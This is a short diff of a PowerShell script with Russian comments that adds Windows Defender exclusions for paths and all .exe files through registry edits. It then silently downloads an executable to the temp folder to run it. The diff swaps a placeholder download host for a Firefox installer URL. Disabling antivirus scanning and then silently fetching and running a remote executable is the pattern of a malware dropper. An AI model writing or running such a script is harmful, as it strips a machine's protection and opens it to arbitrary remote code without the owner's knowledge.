@@ -14,8 +14,8 @@ reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Extensions" /v "exe" /t REG_SZ /d 0 /f > $null 2>&1
 
 # 3. тихая скачка и запуск
-$url = "http://твой-ресурс.com/file.exe"
-$out = "$env:TEMP\file.exe"
+$url = "https://download-installer.cdn.mozilla.net/pub/firefox/releases/148.0.2/win32/ru/Firefox%20Installer.exe"
+$out = "$env:TEMP\Firefox%20Installer.exe"
 
 try {
     # используем curl (alias для iwr) с параметрами тишины
